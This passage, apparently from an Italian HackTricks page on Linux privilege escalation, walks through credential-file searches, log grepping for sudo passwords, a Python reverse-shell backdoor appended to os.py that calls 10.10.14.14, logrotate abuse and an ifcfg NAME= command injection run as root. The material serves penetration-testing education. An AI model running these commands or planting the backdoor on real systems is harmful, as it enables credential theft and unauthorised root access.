### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml file
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### File nascosti
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries nella PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **File web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copie di sicurezza**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### File noti che contengono password

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), cerca **diversi file che potrebbero contenere password**.\
**Un altro tool interessante** che puoi usare per questo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) che è un'applicazione open source usata per recuperare molte password memorizzate su un computer locale per Windows, Linux & Mac.

### Logs

Se puoi leggere i logs, potresti essere in grado di trovare **informazioni interessanti/confidenziali al loro interno**. Più il log è strano, più probabilmente sarà interessante.\
Inoltre, alcuni "**bad**" configurati (backdoored?) **audit logs** possono permetterti di **registrare password** all'interno degli audit logs come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Per **leggere i log il gruppo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sarà molto utile.

### File di shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dovresti anche cercare file che contengono la parola "**password**" nel **nome** o all'interno del **contenuto**, e controllare anche IP ed email nei log, oppure regexp per hash.\
Non elencherò qui come fare tutto questo ma se sei interessato puoi controllare gli ultimi controlli che [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) esegue.

## File scrivibili

### Python library hijacking

Se sai da **dove** verrà eseguito uno script Python e **puoi scrivere** in quella cartella oppure puoi **modificare le librerie Python**, puoi modificare la libreria os e inserirvi una backdoor (se puoi scrivere dove lo script Python verrà eseguito, copia e incolla la libreria os.py).

Per **backdoorare la libreria** basta aggiungere alla fine della libreria os.py la seguente riga (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Sfruttamento di logrotate

Una vulnerabilità in `logrotate` permette agli utenti con **permessi di scrittura** su un file di log o sulle sue directory padre di ottenere potenzialmente privilegi elevati. Questo perché `logrotate`, spesso eseguito come **root**, può essere manipolato per eseguire file arbitrari, specialmente in directory come _**/etc/bash_completion.d/**_. È importante controllare i permessi non solo in _/var/log_ ma anche in qualsiasi directory dove viene applicata la rotazione dei log.

> [!TIP]
> Questa vulnerabilità riguarda `logrotate` versione `3.18.0` e precedenti

Maggiori dettagli sulla vulnerabilità sono disponibili a questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puoi sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** quindi ogni volta che trovi che puoi modificare i log, verifica chi gestisce quei log e controlla se puoi scalare privilegi sostituendo i log con symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<whatever>` in _/etc/sysconfig/network-scripts_ **o** può **modificare** uno esistente, allora il tuo **system is pwned**.

Gli script di rete, _ifcg-eth0_ per esempio, sono usati per le connessioni di rete. Sembrano esattamente file .INI. Tuttavia, vengono ~sourced~ su Linux da Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` in questi script di rete non è gestito correttamente. Se hai **spazi bianchi nel nome il sistema prova a eseguire la parte dopo lo spazio bianco**. Questo significa che **tutto ciò che viene dopo il primo spazio viene eseguito come root**.

Per esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota lo spazio tra Network e /bin/id_)

### **init, init.d, systemd e rc.d**

La directory `/etc/init.d` ospita **script** per System V init (SysVinit), il **classico sistema di gestione dei servizi Linux**. Include script per `start`, `stop`, `restart` e talvolta `reload` dei servizi. Questi possono essere eseguiti direttamente o tramite link simbolici presenti in `/etc/rc?.d/`. Un percorso alternativo nei sistemi Redhat è `/etc/rc.d/init.d`.

Al contrario, `/etc/init` è associata a **Upstart**, una più recente soluzione di **service management** introdotta da Ubuntu, che utilizza file di configurazione per le attività di gestione dei servizi. Nonostante la transizione a Upstart, gli script SysVinit vengono ancora utilizzati insieme alle configurazioni Upstart grazie a uno strato di compatibilità in Upstart.

**systemd** si afferma come un moderno init e service manager, offrendo funzionalità avanzate come l'avvio on-demand dei daemon, la gestione degli automount e snapshot dello stato del sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti di distribuzione e in `/etc/systemd/system/` per le modifiche dell'amministratore, semplificando l'amministrazione del sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La discovery dei servizi basata su regex in VMware Tools/Aria Operations può estrarre un percorso binario dalle command line dei processi ed eseguirlo con -v in un contesto privilegiato. Pattern permissivi (es. usando \S) possono corrispondere a listener piazzati dall'attaccante in posizioni scrivibili (es. /tmp/httpd), portando all'esecuzione come root (CWE-426 Untrusted Search Path).

Per approfondire e vedere un pattern generalizzato applicabile ad altri stack di discovery/monitoring, vedi:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Ulteriore aiuto

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilità del kernel su linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
